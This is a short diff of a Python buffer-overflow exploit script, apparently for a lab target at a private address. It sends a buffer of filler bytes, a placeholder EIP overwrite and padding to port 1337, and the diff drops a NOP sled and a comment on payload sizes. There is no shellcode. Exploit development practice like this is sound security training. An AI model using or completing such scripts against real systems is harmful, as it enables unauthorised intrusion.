@@ -14,13 +14,12 @@ import sys
 
 
 filler = "A" * 1036
-eip = "X" * 4
-extend = "E" * 95   # Just enough to fit our payload -- Typical calc payload is ~220 Bytes :: Shell Payload is ~350 Bytes
-nop_sled = "N" * 16
+eip = "X" * 4 # 4 bytes for EIP
+extend = "E" * 95
 try:
     s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("172.16.110.135", 1337))
-    buffer = filler + eip + nop_sled + extend
+    buffer = filler + eip + extend
     s.send(buffer.encode("latin-1"))
     s.close()
 
